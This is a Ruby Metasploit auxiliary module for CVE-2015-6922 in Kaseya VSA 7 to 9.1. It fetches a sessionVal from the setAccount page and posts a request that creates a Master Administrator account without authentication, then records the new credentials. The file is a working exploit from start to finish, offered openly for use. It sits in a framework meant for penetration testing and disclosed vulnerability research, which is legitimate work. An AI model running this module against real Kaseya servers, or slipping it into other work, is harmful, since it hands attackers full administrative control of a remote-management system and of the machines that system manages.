##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Kaseya VSA Master Administrator Account Creation',
      'Description' => %q{
This module abuses the setAccount page on Kaseya VSA between 7 and 9.1 to create a new
Master Administrator account. Normally this page is only accessible via the localhost
interface, but the application does nothing to prevent this apart from attempting to
force a redirect. This module has been tested with Kaseya VSA v7.0.0.17, v8.0.0.10 and
v9.0.0.3.
},
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2015-6922' ],
          [ 'ZDI', '15-448' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/kaseya-vsa-vuln-2.txt' ],
          [ 'URL', 'TODO_FULLDISC_URL' ]
        ],
      'DisclosureDate' => 'Sep 23 2015'))

    register_options(
      [
        OptString.new('TARGETURI', [ true,  "The Kaseya VSA URI", '/']),
        OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),
        OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password']),
        OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
      ], self.class)
  end


  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/LocalAuth/setAccount.aspx"),
      'method' =>'GET',
    })

    if res and res.body =~ /ID="sessionVal" name="sessionVal" value='([0-9]*)'/
      sessionVal = $1
      print_status("#{peer} - Got sessionVal " + sessionVal + ", creating Master Administrator account")

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, "/LocalAuth/setAccount.aspx"),
        'method' =>'POST',
        'vars_post' => {
          "sessionVal" => sessionVal,
          "adminName" => datastore['USERNAME'],
          "NewPassword" => datastore['PASSWORD'],
          "confirm" => datastore['PASSWORD'],
          "adminEmail" => datastore['EMAIL'],
          "setAccount" => "Create"
        }
      })

      if res and res.code == 302 and res.body =~ /\/vsapres\/web20\/core\/login\.asp/
        print_good("#{peer} - Master Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']} created")
        service_data = {
          address: rhost,
          port: rport,
          service_name: (ssl ? 'https' : 'http'),
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }
        credential_data = {
          origin_type: :service,
          module_fullname: self.fullname,
          private_type: :password,
          private_data: datastore['PASSWORD'],
          username: datastore['USERNAME']
        }

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)
        login_data = {
          core: credential_core,
          access_level: 'Master Administrator',
          status: Metasploit::Model::Login::Status::UNTRIED
        }
        login_data.merge!(service_data)
        create_credential_login(login_data)
      else
        print_error("#{peer} - Master Administrator account creation failed")
      end
    else
      print_error("#{peer} - Failed to get sessionVal")
    end
  end
end
